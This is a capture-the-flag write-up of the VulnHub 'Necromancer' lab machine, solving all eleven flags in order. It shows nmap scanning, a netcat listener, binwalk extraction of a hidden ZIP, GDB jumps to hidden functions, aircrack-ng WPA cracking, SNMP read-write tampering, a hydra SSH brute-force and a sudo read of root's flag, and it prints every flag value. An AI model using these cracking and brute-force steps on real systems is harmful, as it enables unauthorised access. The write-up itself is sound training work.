---
title: "VulnHub: The Necromancer CTF"
date: 2026-06-19 00:00:00 +0100
categories: [Writeups, VulnHub]
tags: [CTF,enumeration,UDP,steganography,binary exploitation,GDB,aircrack,SNMP,hydra,privilege escalation]
image:
  path: /assets/img/writeups/necromancer/cover.png
  alt: VulnHub - The Necromancer
---

My writeup for the Necromancer CTF by @xerubus on VulnHub! This one is a fantasy-themed adventure with 11 flags, involving everything from UDP listeners to WiFi handshake cracking.

- [The Necromancer - VulnHub](https://www.vulnhub.com/entry/the-necromancer-1,154/)

---

## 1. Discovery & Flag 1

### Enumeration

I started with an nmap scan to find the target on my network:
```
┌──(kali㉿kali)-[~]
└─$ sudo nmap -Pn 192.168.55.0/24
Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-17 11:53 +0200

Nmap scan report for 192.168.55.128
Host is up (0.00017s latency).
All 1000 scanned ports on 192.168.55.128 are in ignored states.
Not shown: 1000 filtered tcp ports (no-response)
MAC Address: 00:0C:29:D9:41:0E (VMware)
```
_All 1000 TCP ports are filtered, nothing open. Interesting._

A more aggressive scan confirmed the same result. No TCP services exposed at all. 
So I opened Wireshark to see if there is any traffic on my network at all. 
![Wireshark](/assets/img/writeups/necromancer/01.png)
_And there it is! Traffic on port 4444._
Setting up a netcat listener on port 4444, the target machine connected back to me on its own:

```
┌──(kali㉿kali)-[~]
└─$ nc -lnvp 4444             
listening on [any] 4444 ...
connect to [192.168.55.129] from (UNKNOWN) [192.168.55.128] 35963
...V2VsY29tZSENCg0KWW91IGZpbmQgeW91cnNlbGYgc3Rhcm...
```

_The target sent me a base64-encoded message!_ 
Decoding it with CyberChef revealed a narrative intro and the first flag:

> *You find yourself staring towards the horizon, with nothing but silence surrounding you...*
>
> *You dig further and discover a small wooden box.*
> *flag1{e6078b9b1aac915d11b9fd59791030bf} is engraved on the lid.*
>
> *You open the box, and find a parchment with the following written on it. "Chant the string of flag1 - u666"*

---

## 2. Flag 2 — UDP 666

The hint says "Chant the string of flag1 - u666". The flag hash is an MD5 — cracking it gives us: **opensesame**

I sent that password to UDP port 666:
```
┌──(kali㉿kali)-[~]
└─$ nc -u 192.168.55.128 666
opensesame

A loud crack of thunder sounds as you are knocked to your feet!

Dazed, you start to feel fresh air entering your lungs.

You are free!

In front of you written in the sand are the words:

flag2{c39cd4df8f2e35d20d92c2e44de5f7c6}

Staring up at the crows you can see they are in a formation.

Squinting your eyes from the light coming from the object, you can see the formation looks like the numeral 80.

666 is closed.
```

_The numeral 80 — a web server has opened up!_

---

## 3. Flag 3 — Steganography

Browsing to port 80, I found an image. Downloaded it:
```
┌──(kali㉿kali)-[~/vulnhub/necromancer]
└─$ sudo wget http://192.168.55.128/pics/pileoffeathers.jpg
```

Running `strings` on the image revealed something suspicious at the end: filenames like `feathers.txt` with `UT` and `ux` markers. These are Unix timestamp extra fields from ZIP format, they appear twice because ZIP stores filenames in both the local header and the central directory.

Binwalk confirmed the embedded archive:
```

┌──(root㉿kali)-[/home/kali/vulnhub/necromancer]
└─# binwalk pileoffeathers.jpg

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             JPEG image data, EXIF standard
12            0xC             TIFF image data, little-endian
36994         0x9082          Zip archive data, compressed size: 121, name: feathers.txt
37267         0x9193          End of Zip archive, footer length: 22

┌──(root㉿kali)-[/home/kali/vulnhub/necromancer]
└─# strings pileoffeathers.jpg | tail -20
[...]]
-VRE@
@;3U
feathers.txtUT
/Wux
a`PjkI
JY+|z
feathers.txtUT
/Wux
[...]

```

Unzipping and decoding the base64 content inside:
```
┌──(root㉿kali)-[/home/kali/vulnhub/necromancer]
└─# unzip pileoffeathers.jpg
  inflating: feathers.txt            

└─# cat feathers.txt
ZmxhZzN7OWFkM2Y2MmRiN2I5MWMyOGI2ODEzNzAwMDM5NDYzOWZ9IC0gQ3Jvc3MgdGhlIGNoYXNtIGF0IC9hbWFnaWNicmlkZ2VhcHBlYXJzYXR0aGVjaGFzbQ==
```

Decoded: **flag3{9ad3f62db7b91c28b68137000394639f} - Cross the chasm at /amagicbridgeappearsatthechasm**

> **How to spot embedded files:** Any readable filename with a file extension in `strings` output of a binary file is a massive hint. Normal image data is binary garbage, you'd never expect something like `feathers.txt` to appear. The `UT`/`ux` markers are classic ZIP signatures.

---

## 4. Flag 4 — Binary Exploitation with GDB

At the new endpoint I ran gobuster and found a binary called `talisman`:
```
┌──(root㉿kali)-[/home/kali/vulnhub/necromancer]
└─# gobuster dir -u http://192.168.55.128/amagicbridgeappearsatthechasm/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

talisman             (Status: 200) [Size: 9676]
```

```
└─# file talisman    
talisman: ELF 32-bit LSB executable, Intel i386
```

Running `strings` on it revealed interesting function names: `chantToBreakSpell`, `unhide`, `wearTalisman`. Time to fire up GDB:

```
┌──(root㉿kali)-[~kali/vulnhub/necromancer]
└─# gdb ./talisman
(gdb) info function
Non-debugging symbols:
0x0804844b  unhide
0x0804849d  hide
0x08048529  wearTalisman
0x08048a13  main
0x08048a37  chantToBreakSpell

(gdb) break main
Breakpoint 1 at 0x8048a21
(gdb) run
Breakpoint 1, 0x08048a21 in main ()
(gdb) jump chantToBreakSpell
Continuing at 0x8048a3b.
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
You fall to your knees.. weak and weary.
Turning it over you see words now etched into the surface:
flag4{ea50536158db50247e110a6c89fcf3d3}
Chant these words at u31337
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
```

> **What happened here:** GDB (GNU Debugger) lets you pause a program and jump execution to any function, even ones the program would never normally call. The `chantToBreakSpell` function was hidden code that the developer put in but never connected to the main flow. In real pentesting, this same technique exposes hidden admin functions, lets you skip authentication checks, or bypass licence validation. The `strings` output was the clue, seeing those function names told us there was hidden functionality worth investigating.

---

## 5. Flag 5 — UDP 31337

The flag4 MD5 hash cracks to: **blackmagic**

Sending it to UDP 31337:
```
┌──(root㉿kali)-[~kali/vulnhub/necromancer]
└─# nc -u 192.168.55.128 31337
blackmagic

As you chant the words, a hissing sound echoes from the ice walls.

The blue aura disappears from the cave entrance.

You are attacked by a swarm of bats!

Looking towards one of the torches, you see something on the cave wall.
Above them, a word etched in blood on the wall.

/thenecromancerwillabsorbyoursoul

flag5{0766c36577af58e15545f099a3b15e60}
```

---

## 6. Flag 6 — The Necromancer's Lair

Browsing to `http://192.168.55.128/thenecromancerwillabsorbyoursoul/` directly gave us:

**flag6{b1c3ed8f1db4258e4dcb0ce565f6dc03}**

There was also a downloadable file called `necromancer`. Time to investigate:
```
└─# file necromancer 
necromancer: bzip2 compressed data, block size = 900k

└─# bunzip2 necromancer
└─# file necromancer.out 
necromancer.out: POSIX tar archive (GNU)

└─# tar xvf necromancer.out                      
necromancer.cap
```

_A .cap file — that's a packet capture!_

---

## 7. Flag 7 — Aircrack & SNMP

### Cracking the WiFi handshake

Checking the .cap file with wireshark revealed nothing, but showed it is captured WiFi-traffic!

```
┌──(root㉿kali)-[/home/kali/vulnhub/necromancer]
└─# aircrack-ng necromancer.cap -w /usr/share/wordlists/rockyou.txt

   #  BSSID              ESSID                     Encryption

   1  C4:12:F5:0D:5E:95  community                 WPA (1 handshake, with PMKID)

                           KEY FOUND! [ death2all ]
```

_The WiFi password `death2all` — but there's no WiFi network to join here. It must be a credential for something else._

### SNMP Walk

The WPA key turned out to be an SNMP community string:
```
┌──(root㉿kali)-[/home/kali/vulnhub/necromancer]
└─# snmpwalk -v1 -c death2all 192.168.55.128
iso.3.6.1.2.1.1.1.0 = STRING: "You stand in front of a door."
iso.3.6.1.2.1.1.4.0 = STRING: "The door is Locked. If you choose to defeat me, the door must be Unlocked."
iso.3.6.1.2.1.1.5.0 = STRING: "Fear the Necromancer!"
iso.3.6.1.2.1.1.6.0 = STRING: "Locked - death2allrw!"
```

_The location field hints at a read-write community string: `death2allrw`!_

### Unlocking the door

```
└─# snmpset -v1 -c death2allrw 192.168.55.128 iso.3.6.1.2.1.1.6.0 s "Unlocked"
iso.3.6.1.2.1.1.6.0 = STRING: "Unlocked"

└─# snmpwalk -v1 -c death2all 192.168.55.128                                
iso.3.6.1.2.1.1.4.0 = STRING: "The door is unlocked! You may now enter the Necromancer's lair!"
iso.3.6.1.2.1.1.6.0 = STRING: "flag7{9e5494108d10bbd5f9e7ae52239546c4} - t22"
```

> **Why this works:** SNMP (Simple Network Management Protocol) has a MIB (Management Information Base), a tree of variables describing the device. With a read-write community string you can write new values. The CTF creator repurposed SNMP variables to tell a story, when you write "Unlocked" to the location field, a script detects the change and drops flag 7. The hint `t22` tells us SSH is now open.

---

## 8. Flag 8 — SSH Access

The flag7 MD5 cracks to: **demonslayer**

Hydra to brute-force the SSH password:
```
┌──(root㉿kali)-[/home/kali/vulnhub/necromancer]
└─# hydra -l demonslayer -P /usr/share/wordlists/rockyou.txt ssh://192.168.55.128

[22][ssh] host: 192.168.55.128   login: demonslayer   password: 12345678
```

Logged in and got the flag:
```
└─# ssh demonslayer@192.168.55.128

          .                                                      .
        .n                   .                 .                  n.
  .   .dP                  dP                   9b                 9b.    .
                               THE NECROMANCER!
                                 by  @xerubus

$ cat flag8.txt
You enter the Necromancer's Lair!

"You are damned already my friend.  Now prepare for your own death!" 

Defend yourself!  Counter attack the Necromancer's spells at u777!
```

---

## 9. Flags 8, 9 & 10 — The Final Battle

The hint says UDP 777 — but connecting from my Kali machine didn't work. The service is only listening on localhost, so I used netcat from within the SSH session:

```
$ nc -u localhost 777

** You only have 3 hitpoints left! **

Defend yourself from the Necromancer's Spells!

Where do the Black Robes practice magic of the Greater Path?  Kelewan

flag8{55a6af2ca3fee9f2fef81d20743bda2c}

Who did Johann Faust VIII make a deal with?  Mephistopheles

flag9{713587e17e796209d1df4c9c2c2d2966}

Who is tricked into passing the Ninth Gate?  Hedge

flag10{8dc6486d2c63cafcdc6efbba2be98ee4}

A great flash of light knocks you to the ground; momentarily blinding you!
The room is silent.
On the ground is a small vile.
```

_Three trivia questions from fantasy literature: Kelewan (Raymond E. Feist), Mephistopheles (Faust legend), and Hedge (Garth Nix's Old Kingdom series)._

---

## 10. Flag 11 — Root

_On the ground is a small vile._
After defeating the Necromancer, I had to find the vile:
```
$ find / -name "*vile" 2>/dev/null 
/home/demonslayer/.smallvile

$ cat /home/demonslayer/.smallvile 
You pick up the small vile.
You drink the elixir and feel a great power within your veins!
```

Checking sudo privileges:
```
$ sudo -l
User demonslayer may run the following commands on thenecromancer:
    (ALL) NOPASSWD: /bin/cat /root/flag11.txt

$ sudo /bin/cat /root/flag11.txt

Congratulations!!! You have conquered......

                               THE NECROMANCER!
                                 by  @xerubus

                   flag11{42c35828545b926e79a36493938ab1b1}
```

---

## Summary

| Flag | Technique |
|------|-----------|
| 1 | Netcat listener, base64 decode |
| 2 | MD5 cracking, UDP communication |
| 3 | Steganography, binwalk |
| 4 | Binary exploitation with GDB |
| 5 | MD5 cracking, UDP communication |
| 6 | Web enumeration |
| 7 | Aircrack-ng, SNMP read/write |
| 8 -10| Hydra SSH brute-force, Trivia / OSINT |
| 11 | Sudo privilege escalation |

This was a really creative CTF with excellent narrative design. Each flag naturally leads to the next through in-game hints, and the variety of techniques keeps things interesting, from network protocols to binary reversing to wireless cracking.

---

That's it for today! Thanks for passing by! Keep learning!
